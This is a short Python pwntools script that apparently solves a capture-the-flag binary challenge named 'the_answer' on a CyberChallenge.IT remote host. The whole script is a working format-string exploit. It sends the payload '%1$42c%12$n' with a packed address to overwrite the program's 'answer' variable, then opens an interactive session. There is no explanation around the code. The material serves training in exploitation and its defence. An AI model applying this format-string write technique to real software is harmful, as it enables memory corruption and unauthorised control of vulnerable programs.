#!/usr/bin/env python3
from pwn import *

bin_name = "./the_answer"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("answer.challs.cyberchallenge.it", 9122)
    else:
        return process(elf.path)

def main():
    r = conn()

    r.recvuntil(b'name?\n')
    ans = elf.sym['answer']
    payload=b"%1$42c%12$n" + b'A'*5 + p64(ans)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
